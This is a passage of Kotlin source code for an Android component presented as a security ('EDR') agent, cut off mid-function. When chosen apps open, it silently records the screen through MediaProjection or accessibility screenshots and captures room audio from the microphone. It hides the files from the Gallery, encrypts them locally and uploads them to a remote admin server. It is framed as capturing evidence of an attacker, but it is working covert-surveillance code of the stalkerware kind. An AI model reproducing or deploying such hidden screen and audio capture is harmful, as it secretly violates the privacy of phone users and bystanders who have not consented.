package com.edr.agent.screen

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Log
import android.view.Surface
import androidx.core.content.ContextCompat
import com.edr.agent.crypto.EdrFileLocker
import com.edr.agent.network.EdrHttpClient
import com.edr.agent.network.EdrNetworkManager
import com.edr.agent.service.EdrAccessibilityService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Autonomous App Trap Screen Recorder — Ultra Smooth Dual-Engine (v3.8.0)
 *
 * Engine 1 (Primary - Hardware 30 FPS):
 *  • MediaProjection → MediaCodec Surface Input → VirtualDisplay.
 *  • Hardware-accelerated H.264 at full 30 FPS, 2 Mbps bitrate, 720x1280 resolution.
 *  • Zero CPU copy, zero screenshot jitter, butter-smooth 1:1 screen motion.
 *
 * Engine 2 (Autonomous Fallback):
 *  • CFR screenshot-based encoder if MediaProjection token is temporarily pending.
 *  • Triggers silent MediaProjection acquisition so subsequent sessions run on Engine 1.
 *
 * Recording is never indexed by MediaScanner (.nomedia in place).
 * On upload failure or 4G LTE, files are AES-256-CBC encrypted & locked in /EDR/ folder.
 */
object AppTrapScreenRecorder {
    private const val TAG = "AppTrapRecorder"

    private val isRecording = AtomicBoolean(false)
    private var currentPackageName: String? = null
    private var currentAppLabel: String? = null
    private var recordingStartTime = 0L

    // Active engine flag: true = Hardware Surface (30 FPS), false = Screenshot Fallback
    private var isHardwareMode = false

    private var outputFile: File? = null
    private var audioOutputFile: File? = null
    private var audioRecorder: MediaRecorder? = null
    private var mediaMuxer: MediaMuxer? = null
    private var mediaCodec: MediaCodec? = null
    private var inputSurface: Surface? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var projectionCallback: MediaProjection.Callback? = null
    private var videoTrackIndex = -1
    private var isMuxerStarted = false
    private var frameCount = 0L

    // Dedicated drain thread for hardware encoder output
    private var drainThread: HandlerThread? = null
    private var drainHandler: Handler? = null
    private var drainRunnable: Runnable? = null

    // Fallback screenshot thread & variables
    private var captureThread: HandlerThread? = null
    private var captureHandler: Handler? = null
    private var screenshotTicker: Runnable? = null
    private var frameTicker: Runnable? = null
    private val isTakingScreenshot = AtomicBoolean(false)
    private var lastScreenshotAttemptTime = 0L
    private val latestYuvLock = Any()
    private var latestYuv: ByteArray? = null
    private var tempYuv: ByteArray? = null
    private var reusableArgb: IntArray? = null
    private var reusableYuv: ByteArray? = null
    private val encoderLock = Any()

    // Video recording parameters (720x1280: 16-pixel aligned, universal hardware support)
    private const val HW_WIDTH = 720       // 45 * 16
    private const val HW_HEIGHT = 1280     // 80 * 16
    private const val HW_DENSITY = 260
    private const val HW_FPS = 30
    private const val HW_BITRATE = 2_000_000 // 2 Mbps crisp high-definition video

    // Fallback parameters (368x800 for lower memory footprint)
    private const val FB_WIDTH = 368
    private const val FB_HEIGHT = 800
    private const val FB_FPS = 16
    private const val FB_BITRATE = 1_200_000

    private val httpClient = EdrHttpClient.uploadClient

    fun isCurrentlyRecording(): Boolean = isRecording.get()

    fun getRecordingPackage(): String? = currentPackageName

    /**
     * Starts recording screen silently because a trapped application opened.
     * Prefers Engine 1 (Hardware 30 FPS via MediaProjection).
     * Falls back to Engine 2 (Accessibility Screenshots) if token is pending.
     */
    @Synchronized
    fun startRecording(context: Context, packageName: String, appLabel: String) {
        if (SyncPreferences.isAgentPaused) {
            Log.d(TAG, "Agent is paused by administrator. Refusing to start trap recording.")
            return
        }

        if (isRecording.get()) {
            Log.w(TAG, "Recording already active for $currentPackageName — ignoring new start for $packageName")
            return
        }

        try {
            val recDir = EdrLocalStorage.getTrapRecordingsDir(context)
            val now = Date()
            val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(now)
            val timeStr = SimpleDateFormat("HH-mm-ss", Locale.US).format(now)
            val safeAppName = appLabel
                .replace(Regex("[^a-zA-Z0-9._-]"), "_")
                .trim('_')
                .ifEmpty { packageName }
            val filename = "trap_${safeAppName}__${dateStr}__${timeStr}.mp4"
            outputFile = File(recDir, filename)

            // Concurrently record room audio during trapped app session
            val audioFilename = "trap_${safeAppName}__${dateStr}__${timeStr}__audio.m4a"
            val targetAudioFile = File(recDir, audioFilename)
            startAudioRecording(context, targetAudioFile)

            currentPackageName = packageName
            currentAppLabel = appLabel
            recordingStartTime = System.currentTimeMillis()
            frameCount = 0L
            videoTrackIndex = -1
            isMuxerStarted = false

            val projection = ScreenStreamManager.mediaProjection

            if (projection != null) {
                // ── ENGINE 1: HARDWARE 30 FPS SURFACE RECORDING ──
                startHardwareRecording(context, projection, packageName, appLabel)
            } else {
                // ── ENGINE 2: ACCESSIBILITY SCREENSHOT RECORDING (Completely Silent & Non-Intrusive) ──
                Log.i(TAG, "Recording app trap silently using accessibility engine for $appLabel...")
                startFallbackRecording(context, packageName, appLabel)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start trap screen recorder: ${e.message}", e)
            EdrLocalStorage.appendEdrLog(context, "TRAP_ERR", "Failed starting trap recorder: ${e.message}")
            cleanup()
        }
    }

    // ─────────────────────────────────────────────────────────────
    // ENGINE 1: HARDWARE 30 FPS (Surface Input + VirtualDisplay)
    // ─────────────────────────────────────────────────────────────

    private fun startHardwareRecording(
        context: Context,
        projection: MediaProjection,
        packageName: String,
        appLabel: String
    ) {
        isHardwareMode = true

        val format = MediaFormat.createVideoFormat(
            MediaFormat.MIMETYPE_VIDEO_AVC,
            HW_WIDTH,
            HW_HEIGHT
        ).apply {
            setInteger(
                MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface
            )
            setInteger(MediaFormat.KEY_BIT_RATE, HW_BITRATE)
            setInteger(MediaFormat.KEY_FRAME_RATE, HW_FPS)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1) // 1s keyframe for fast seeking
            setInteger(MediaFormat.KEY_PRIORITY, 0)         // Realtime priority
        }

        val encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        inputSurface = encoder.createInputSurface()
        encoder.start()
        mediaCodec = encoder

        mediaMuxer = MediaMuxer(
            outputFile!!.absolutePath,
            MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4
        )

        projectionCallback = object : MediaProjection.Callback() {
            override fun onStop() {
                Log.w(TAG, "MediaProjection stopped by system during trap recording.")
                if (isRecording.get()) {
                    stopRecording(context.applicationContext)
                }
            }
        }
        projection.registerCallback(projectionCallback!!, null)

        virtualDisplay = projection.createVirtualDisplay(
            "EDR_TrapRecorder",
            HW_WIDTH,
            HW_HEIGHT,
            HW_DENSITY,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            inputSurface,
            null,
            null
        )

        drainThread = HandlerThread("EDR_TrapDrainThread").apply { start() }
        drainHandler = Handler(drainThread!!.looper)

        isRecording.set(true)
        Log.i(TAG, "Engine 1 Active: 30 FPS Hardware Trap Recording for $appLabel ($packageName) -> ${outputFile!!.name}")
        EdrLocalStorage.appendEdrLog(
            context, "TRAP_REC",
            "Started 30 FPS hardware recording for $appLabel ($packageName)"
        )

        scheduleHwDrainLoop()
    }

    private fun scheduleHwDrainLoop() {
        drainRunnable = object : Runnable {
            override fun run() {
                if (!isRecording.get()) return
                try {
                    drainEncoder(false)
                } catch (e: Exception) {
                    Log.e(TAG, "HW drain loop error: ${e.message}")
                }
                if (isRecording.get()) {
                    drainHandler?.postDelayed(this, 33L) // ~30 FPS cadence
                }
            }
        }
        drainHandler?.postDelayed(drainRunnable!!, 33L)
    }

    // ─────────────────────────────────────────────────────────────
    // ENGINE 2: ACCESSIBILITY SCREENSHOT FALLBACK
    // ─────────────────────────────────────────────────────────────

    private fun startFallbackRecording(
        context: Context,
        packageName: String,
        appLabel: String
    ) {
        isHardwareMode = false

        val encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
        val chosenColor = chooseColorFormat(encoder)

        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, FB_WIDTH, FB_HEIGHT).apply {
            setInteger(MediaFormat.KEY_COLOR_FORMAT, chosenColor)
            setInteger(MediaFormat.KEY_BIT_RATE, FB_BITRATE)
            setInteger(MediaFormat.KEY_FRAME_RATE, FB_FPS)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1)
        }

        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        encoder.start()
        mediaCodec = encoder

        mediaMuxer = MediaMuxer(outputFile!!.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)

        drainThread = HandlerThread("EDR_TrapRecorderThread").apply { start() }
        drainHandler = Handler(drainThread!!.looper)
        captureThread = HandlerThread("EDR_TrapCaptureThread").apply { start() }
        captureHandler = Handler(captureThread!!.looper)

        val yuvSize = FB_WIDTH * FB_HEIGHT * 3 / 2
        reusableArgb = IntArray(FB_WIDTH * FB_HEIGHT)
        reusableYuv = ByteArray(yuvSize)
        latestYuv = ByteArray(yuvSize)
        tempYuv = ByteArray(yuvSize)

        isRecording.set(true)
        Log.i(TAG, "Engine 2 Active: Fallback Screenshot Recording for $appLabel ($packageName)")

        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager

        // Screenshot grabber loop
        screenshotTicker = object : Runnable {
            override fun run() {
                if (!isRecording.get()) return
                if (powerManager?.isInteractive == false) {
                    captureHandler?.postDelayed(this, 800L)
                    return
                }

                val a11y = EdrAccessibilityService.instance
                val now = System.currentTimeMillis()
                if (isTakingScreenshot.get() && (now - lastScreenshotAttemptTime > 1500L)) {
                    isTakingScreenshot.set(false)
                }

                if (a11y != null && isTakingScreenshot.compareAndSet(false, true)) {
                    lastScreenshotAttemptTime = now
                    a11y.takeSilentScreenshot(FB_WIDTH, FB_HEIGHT) { bitmap ->
                        try {
                            if (isRecording.get() && bitmap != null) {
                                val scaled = if (bitmap.width == FB_WIDTH && bitmap.height == FB_HEIGHT) {
                                    bitmap
                                } else {
                                    Bitmap.createScaledBitmap(bitmap, FB_WIDTH, FB_HEIGHT, false)
                                }
                                val converted = bitmapToNv12(scaled, FB_WIDTH, FB_HEIGHT)
                                if (scaled !== bitmap) scaled.recycle()
                                bitmap.recycle()
                                synchronized(latestYuvLock) {
                                    latestYuv?.let { dest ->
                                        System.arraycopy(converted, 0, dest, 0, dest.size)
                                    }
                                }
                            } else {
                                bitmap?.recycle()
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Screenshot conversion error: ${e.message}")
                            try { bitmap?.recycle() } catch (_: Exception) {}
                        } finally {
                            isTakingScreenshot.set(false)
                            if (isRecording.get()) {
                                captureHandler?.post(screenshotTicker!!)
                            }
                        }
                    }
                } else if (isRecording.get()) {
                    captureHandler?.postDelayed(this, 30L)
                }
            }
        }

        // Encoder CFR feed loop
        frameTicker = object : Runnable {
            override fun run() {
                if (!isRecording.get()) return

                synchronized(encoderLock) {
                    if (!isRecording.get()) return@synchronized
                    val bufToEncode = tempYuv
                    val src = latestYuv
                    if (bufToEncode != null && src != null) {
                        synchronized(latestYuvLock) {
                            System.arraycopy(src, 0, bufToEncode, 0, bufToEncode.size)
                        }
                        encodeYuvFrame(bufToEncode)
                    }
                }

                if (isRecording.get()) {
                    val nextTargetMs = recordingStartTime + (frameCount * 1000L / FB_FPS)
                    val delay = (nextTargetMs - System.currentTimeMillis()).coerceIn(1L, (1000L / FB_FPS))
                    drainHandler?.postDelayed(this, delay)
                }
            }
        }

        captureHandler?.post(screenshotTicker!!)
        drainHandler?.postDelayed(frameTicker!!, (1000L / FB_FPS))
    }

    private fun chooseColorFormat(codec: MediaCodec): Int {
        try {
            val caps = codec.codecInfo.getCapabilitiesForType(MediaFormat.MIMETYPE_VIDEO_AVC)
            for (color in caps.colorFormats) {
                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar) return color
            }
            for (color in caps.colorFormats) {
                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible) return color
            }
            return caps.colorFormats.firstOrNull() ?: MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar
        } catch (e: Exception) {
            return MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar
        }
    }

    private fun encodeYuvFrame(yuv: ByteArray) {
        val codec = mediaCodec ?: return
        try {
            val inputIndex = codec.dequeueInputBuffer(10000L)
            if (inputIndex >= 0) {
                val inputBuffer = codec.getInputBuffer(inputIndex) ?: return
                inputBuffer.clear()
                inputBuffer.put(yuv)

                val ptsUs = frameCount * 1_000_000L / FB_FPS
                frameCount++
                codec.queueInputBuffer(inputIndex, 0, yuv.size, ptsUs, 0)
            }
            drainEncoder(false)
        } catch (e: Exception) {
            Log.e(TAG, "Error encoding fallback frame #$frameCount: ${e.message}")
        }
    }

    // ─────────────────────────────────────────────────────────────
    // STOP RECORDING
    // ─────────────────────────────────────────────────────────────

    @Synchronized
    fun stopRecording(context: Context) {
        if (!isRecording.getAndSet(false)) return

        val pkg = currentPackageName ?: "unknown"
        val label = currentAppLabel ?: pkg
        val durationMs = (System.currentTimeMillis() - recordingStartTime).coerceAtLeast(1000L)
        val durationSec = (durationMs / 1000).toInt()
        var durationFormatted = String.format("%02d:%02d", durationSec / 60, durationSec % 60)

        Log.i(TAG, "Stopping trap recording for $label ($pkg). Mode=${if (isHardwareMode) "Hardware-30FPS" else "Fallback"}. Elapsed: $durationFormatted")
        EdrLocalStorage.appendEdrLog(context, "TRAP_REC", "App closed. Finalizing video for $label ($durationFormatted)")

        if (isHardwareMode) {
            // Stop feeding frames from VirtualDisplay
            try { virtualDisplay?.release() } catch (ignored: Exception) {}
            virtualDisplay = null

            try {
                projectionCallback?.let { ScreenStreamManager.mediaProjection?.unregisterCallback(it) }
            } catch (ignored: Exception) {}
            projectionCallback = null

            try {
                mediaCodec?.signalEndOfInputStream()
                drainEncoder(true)
            } catch (e: Exception) {
                Log.e(TAG, "Error signalling EOS: ${e.message}")
            }
        } else {
            synchronized(encoderLock) {
                try {
                    val inputIndex = mediaCodec?.dequeueInputBuffer(10000L) ?: -1
                    if (inputIndex >= 0) {
                        val ptsUs = frameCount * 1_000_000L / FB_FPS
                        mediaCodec?.queueInputBuffer(inputIndex, 0, 0, ptsUs, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
                    }
                    drainEncoder(true)
                } catch (e: Exception) {
                    Log.e(TAG, "Error draining fallback encoder: ${e.message}")
                }
            }
        }

        val audio = stopAudioRecording()
        cleanup()

        val video = outputFile
        if (video != null && video.exists() && video.length() > 500) {
            // Read exact duration directly from MP4 container header
            try {
                val retriever = android.media.MediaMetadataRetriever()
                retriever.setDataSource(video.absolutePath)
                val durMs = retriever.extractMetadata(
                    android.media.MediaMetadataRetriever.METADATA_KEY_DURATION
                )?.toLongOrNull()
                retriever.release()
                if (durMs != null && durMs > 0) {
                    val sec = (durMs / 1000).toInt()
                    durationFormatted = String.format("%02d:%02d", sec / 60, sec % 60)
                }
            } catch (e: Exception) {
                Log.w(TAG, "MediaMetadataRetriever warning: ${e.message}")
            }

            Log.i(TAG, "Video finalized: ${video.name} (${video.length()} bytes, duration: $durationFormatted, audio: ${audio?.name ?: "none"})")
            // NOTE: MediaScannerConnection is intentionally omitted to keep file hidden from Gallery.
            uploadTrapRecording(context, video, audio, pkg, label, durationFormatted)
        } else {
            Log.w(TAG, "Video file too small or missing (${video?.length()} bytes). Discarding.")
            video?.delete()
            audio?.delete()
        }
    }

    // ─────────────────────────────────────────────────────────────
    // ENCODER DRAIN
    // ─────────────────────────────────────────────────────────────

    private val bufferInfo = MediaCodec.BufferInfo()

    private fun drainEncoder(endOfStream: Boolean) {
        val codec = mediaCodec ?: return
        val muxer = mediaMuxer ?: return

        var retries = 0
        while (true) {
            val idx = codec.dequeueOutputBuffer(bufferInfo, if (endOfStream) 50_000L else 10_000L)
            when {
                idx == MediaCodec.INFO_TRY_AGAIN_LATER -> {
                    if (!endOfStream) break
                    if (++retries > 15) break
                }
                idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
                    if (!isMuxerStarted) {
                        videoTrackIndex = muxer.addTrack(codec.outputFormat)
                        muxer.start()
                        isMuxerStarted = true
                        Log.i(TAG, "MediaMuxer started with track index: $videoTrackIndex")
                    }
                }
                idx >= 0 -> {
                    val buf = codec.getOutputBuffer(idx)
                    if (buf != null && bufferInfo.size > 0 && isMuxerStarted) {
                        if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG == 0) {
                            buf.position(bufferInfo.offset)
                            buf.limit(bufferInfo.offset + bufferInfo.size)
                            muxer.writeSampleData(videoTrackIndex, buf, bufferInfo)
                            frameCount++
                        }
                    }
                    codec.releaseOutputBuffer(idx, false)
                    if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
                        break
                    }
                }
            }
        }
    }

    // ─────────────────────────────────────────────────────────────
    // AUDIO RECORDING
    // ─────────────────────────────────────────────────────────────

    private fun startAudioRecording(context: Context, targetFile: File) {
        val hasMicPerm = ContextCompat.checkSelfPermission(
            context, Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasMicPerm) {
            Log.w(TAG, "RECORD_AUDIO permission not granted; skipping trap audio recording.")
            return
        }

        try {
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64000)
            recorder.setAudioSamplingRate(44100)
            recorder.setOutputFile(targetFile.absolutePath)
            recorder.prepare()
            recorder.start()

            audioRecorder = recorder
            audioOutputFile = targetFile
            Log.i(TAG, "Trap Audio Recorder started -> ${targetFile.name}")
        } catch (e: Exception) {
            Log.w(TAG, "Could not start trap audio recorder: ${e.message}")
            try {
                audioRecorder?.release()
            } catch (ignored: Exception) {}
            audioRecorder = null
            audioOutputFile = null
        }
    }

    private fun stopAudioRecording(): File? {
        val recorder = audioRecorder
        audioRecorder = null
        if (recorder != null) {
            try {
                recorder.stop()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecorder stop note: ${e.message}")
            }
            try {
                recorder.release()
            } catch (ignored: Exception) {}
        }

        val audio = audioOutputFile
        audioOutputFile = null
        return if (audio != null && audio.exists() && audio.length() > 200) {
            audio
        } else {
            try { audio?.delete() } catch (ignored: Exception) {}
            null
        }
    }

    // ─────────────────────────────────────────────────────────────
    // CLEANUP
    // ─────────────────────────────────────────────────────────────

    private fun cleanup() {
        stopAudioRecording()
        drainRunnable = null
        drainThread?.quitSafely()
        drainThread = null
        drainHandler = null

        captureThread?.quitSafely()
        captureThread = null
        captureHandler = null
        frameTicker = null
        screenshotTicker = null

        try { mediaCodec?.stop() } catch (ignored: Exception) {}
        try { mediaCodec?.release() } catch (ignored: Exception) {}
        mediaCodec = null

        try { inputSurface?.release() } catch (ignored: Exception) {}
        inputSurface = null

        if (isMuxerStarted) {
            try { mediaMuxer?.stop() } catch (e: Exception) {
                Log.w(TAG, "MediaMuxer stop warning: ${e.message}")
            }
        }
        try { mediaMuxer?.release() } catch (ignored: Exception) {}
        mediaMuxer = null
        isMuxerStarted = false

        synchronized(latestYuvLock) { latestYuv = null }
        tempYuv = null
        reusableArgb = null
        reusableYuv = null
        isTakingScreenshot.set(false)

        currentPackageName = null
        currentAppLabel = null
        isHardwareMode = false
    }

    // ─────────────────────────────────────────────────────────────
    // UPLOAD / LOCK
    // ─────────────────────────────────────────────────────────────

    private fun uploadTrapRecording(
        context: Context,
        file: File,
        audioFile: File?,
        packageName: String,
        appLabel: String,
        duration: String
    ) {
        Thread {
            val netStatus = EdrNetworkManager.getNetworkStatus(context)
            if (!netStatus.isCloudUploadAllowed) {
                Log.i(TAG, "Current network is ${netStatus.label}. Upload paused to save mobile data. Locking recording locally...")
                EdrLocalStorage.appendEdrLog(
                    context,
                    "DATA_SAVER",
                    "Upload paused on ${netStatus.label}. Locked video & audio in /EDR/ folder with password protection."
                )
                val locked = EdrFileLocker.lockFile(file, EdrFileLocker.PASSWORD_EDR)
                if (locked != null) {
                    Log.i(TAG, "Recording saved safely as ${locked.name} in /EDR/trap_recordings/")
                }
                if (audioFile != null && audioFile.exists()) {
                    val lockedAudio = EdrFileLocker.lockFile(audioFile, EdrFileLocker.PASSWORD_EDR)
                    if (lockedAudio != null) {
                        Log.i(TAG, "Audio saved safely as ${lockedAudio.name} in /EDR/trap_recordings/")
                    }
                }
                return@Thread
            }

            var uploadedSuccessfully = false
            try {
                Log.i(TAG, "Uploading trap video (${file.length()} bytes) and audio (${audioFile?.length() ?: 0} bytes) over ${netStatus.label} to EDR Admin Server...")
                val deviceId = SyncPreferences.deviceId
                val url = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/recordings"

                val bodyBuilder = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("duration", duration)
                    .addFormDataPart("recordingType", "APP_TRAP")
                    .addFormDataPart("appName", appLabel)
                    .addFormDataPart("packageName", packageName)
                    .addFormDataPart(
                        "video",
                        file.name,
                        file.asRequestBody("video/mp4".toMediaType())
                    )

                if (audioFile != null && audioFile.exists() && audioFile.length() > 200) {
                    bodyBuilder.addFormDataPart(
                        "audio",
                        audioFile.name,
                        audioFile.asRequestBody("audio/mp4".toMediaType())
                    )
                }

                val body = bodyBuilder.build()
                val request = Request.Builder().url(url).post(body).build()
                val response = httpClient.newCall(request).execute()
                uploadedSuccessfully = response.isSuccessful
                val code = response.code
                response.close()

                if (uploadedSuccessfully) {
                    val audioMsg = if (audioFile != null) " with room audio" else ""
                    Log.i(TAG, "Trap video$audioMsg uploaded successfully! (${file.name})")
                    EdrLocalStorage.appendEdrLog(
                        context,
                        "EVIDENCE",
                        "Uploaded attacker video$audioMsg for $appLabel ($duration) to EDR server. Removing local copy from phone."
                    )
                    try {
                        if (file.exists()) file.delete()
                    } catch (e: Exception) {
                        Log.w(TAG, "Could not delete local video file: ${e.message}")
                    }
                    try {
                        if (audioFile?.exists() == true) audioFile.delete()
                    } catch (e: Exception) {
                        Log.w(TAG, "Could not delete local audio file: ${e.message}")
                    }
                } else {
                    Log.e(TAG, "Server rejected trap video/audio upload: HTTP $code")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed uploading trap video/audio: ${e.message}", e)
            } finally {
                if (!uploadedSuccessfully) {
                    if (file.exists()) {
                        try {
                            val locked = EdrFileLocker.lockFile(file, EdrFileLocker.PASSWORD_EDR)
                            if (locked != null) {
                                Log.i(TAG, "Recording file locked: ${locked.name}")
                            }
                        } catch (lockEx: Exception) {
                            Log.e(TAG, "Failed locking recording file: ${lockEx.message}", lockEx)
                        }
                    }
                    if (audioFile?.exists() == true) {
                        try {
                            val lockedAudio = EdrFileLocker.lockFile(audioFile, EdrFileLocker.PASSWORD_EDR)
                            if (lockedAudio != null) {
                                Log.i(TAG, "Audio file locked: ${lockedAudio.name}")
                            }
                        } catch (lockEx: Exception) {
                            Log.e(TAG, "Failed locking audio file: ${lockEx.message}", lockEx)
                        }
                    }
                }
            }
        }.start()
    }

    // ─────────────────────────────────────────────────────────────
    // FLUSH PENDING LOCKED RECORDINGS
    // ─────────────────────────────────────────────────────────────

    fun flushPendingLockedRecordings(context: Context) {
        Thread {
            try {
                if (!EdrNetworkManager.isCloudUploadAllowed(context)) {
                    Log.d(TAG, "Cannot flush offline recordings: currently on restricted network (${EdrNetworkManager.getConnectionTypeLabel(context)})")
                    return@Thread
                }
                val candidateDirs = listOf(
                    EdrLocalStorage.getTrapRecordingsDir(context),
                    File("/sdcard/EDR/trap_recordings"),
                    File(android.os.Environment.getExternalStorageDirectory(), "EDR/trap_recordings")
                ).distinctBy { it.absolutePath }.filter { it.exists() && it.isDirectory }

                for (recDir in candidateDirs) {
                    EdrLocalStorage.ensureNoMedia(recDir)
                    val files = recDir.listFiles() ?: continue

                    for (f in files) {
                        if (f.name.startsWith(".trashed-")) {
                            try { f.delete() } catch (ignored: Exception) {}
                        } else if ((f.name.endsWith(".mp4") || f.name.endsWith(".m4a")) && f != outputFile && f != audioOutputFile) {
                            try {
                                EdrFileLocker.lockFile(f, EdrFileLocker.PASSWORD_EDR)
                            } catch (ignored: Exception) {}
                        }
                    }

                    val lockedFiles = recDir.listFiles { _, name -> name.endsWith(EdrFileLocker.LOCKED_EXTENSION) }
                    if (lockedFiles.isNullOrEmpty()) continue

                    val deviceId = SyncPreferences.deviceId
                    val baseUrl = SyncPreferences.httpBaseUrl
                    if (deviceId.isEmpty() || baseUrl.isEmpty()) continue

                    val lockedVideos = lockedFiles.filter { it.name.endsWith(".mp4" + EdrFileLocker.LOCKED_EXTENSION) }
                    Log.i(TAG, "Found ${lockedVideos.size} offline locked recording(s) in ${recDir.name}. Retrying upload...")

                    for (locked in lockedVideos) {
                        val rawName = locked.name.removeSuffix(EdrFileLocker.LOCKED_EXTENSION)
                        val appLabel = if (rawName.startsWith("trap_")) {
                            val clean = rawName.removePrefix("trap_").removeSuffix(".mp4")
                            clean.split("__").firstOrNull()?.replace('_', ' ') ?: "App"
                        } else {
                            "App"
                        }

                        // Check for matching offline audio file
                        val matchingAudioLocked = File(recDir, rawName.removeSuffix(".mp4") + "__audio.m4a" + EdrFileLocker.LOCKED_EXTENSION)
                        var tempAudioOut: File? = null
                        if (matchingAudioLocked.exists()) {
                            val tAudio = File(context.cacheDir, "temp_upload_${System.currentTimeMillis()}_audio.m4a")
                            if (EdrFileLocker.unlockToFile(matchingAudioLocked, tAudio, EdrFileLocker.PASSWORD_EDR) && tAudio.exists()) {
                                tempAudioOut = tAudio
                            } else {
                                tAudio.delete()
                            }
                        }

                        val tempOut = File(context.cacheDir, "temp_upload_${System.currentTimeMillis()}_$rawName")
                        val unlocked = EdrFileLocker.unlockToFile(locked, tempOut, EdrFileLocker.PASSWORD_EDR)
                        if (!unlocked || !tempOut.exists()) {
                            tempOut.delete()
                            tempAudioOut?.delete()
                            continue
                        }

                        try {
                            var offlineDuration = "00:00"
                            try {
                                val retriever = android.media.MediaMetadataRetriever()
                                retriever.setDataSource(tempOut.absolutePath)
                                val durMs = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION)?.toLongOrNull()
                                retriever.release()
                                if (durMs != null && durMs > 0) {
                                    val sec = (durMs / 1000).toInt()
                                    offlineDuration = String.format("%02d:%02d", sec / 60, sec % 60)
                                }
                            } catch (retEx: Exception) {
                                Log.w(TAG, "Offline video duration read fallback: ${retEx.message}")
                            }

                            val bodyBuilder = MultipartBody.Builder()
                                .setType(MultipartBody.FORM)
                                .addFormDataPart("duration", offlineDuration)
                                .addFormDataPart("recordingType", "APP_TRAP")
                                .addFormDataPart("appName", appLabel)
                                .addFormDataPart("packageName", "unknown")
                                .addFormDataPart(
                                    "video",
                                    rawName,
                                    tempOut.asRequestBody("video/mp4".toMediaType())
                                )

                            if (tempAudioOut != null && tempAudioOut.exists() && tempAudioOut.length() > 200) {
                                bodyBuilder.addFormDataPart(
                                    "audio",
                                    matchingAudioLocked.name.removeSuffix(EdrFileLocker.LOCKED_EXTENSION),
                                    tempAudioOut.asRequestBody("audio/mp4".toMediaType())
                                )
                            }

                            val body = bodyBuilder.build()
                            val request = Request.Builder()
                                .url("$baseUrl/api/devices/$deviceId/recordings")
                                .post(body)
                                .build()

                            val response = httpClient.newCall(request).execute()
                            val isOk = response.isSuccessful
                            response.close()

                            if (isOk) {
                                Log.i(TAG, "Successfully flushed offline recording & audio to admin: $rawName. Removing locked files.")
                                locked.delete()
                                matchingAudioLocked.delete()
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Failed uploading offline recording ${locked.name}: ${e.message}")
                        } finally {
                            tempOut.delete()
                            tempAudioOut?.delete()
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error in flushPendingLockedRecordings: ${e.message}")
            }
        }.start()
    }

    private fun bitmapToNv12(bitmap: Bitmap, width: Int, height: Int): ByteArray {
        val neededPixels = width * height
        val argb = reusableArgb?.takeIf { it.size == neededPixels }
            ?: IntArray(neededPixels).also { reusableArgb = it }
        bitmap.getPixels(argb, 0, width, 0, 0, width, height)

        val neededYuv = neededPixels * 3 / 2
        val yuv = reusableYuv?.takeIf { it.size == neededYuv }
            ?: ByteArray(neededYuv).also { reusableYuv = it }
        val frameSize = width * height
        var yIndex = 0
        var uvIndex = frameSize

        var r: Int
        var g: Int
        var b: Int
        var y: Int
        var u: Int
        var v: Int
        var index = 0

        for (j in 0 until height) {
            val evenRow = (j and 1) == 0
            for (i in 0 until width) {
                val pixel = argb[index++]
                r = (pixel shr 16) and 0xff
                g = (pixel shr 8) and 0xff
                b = pixel and 0xff

                y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
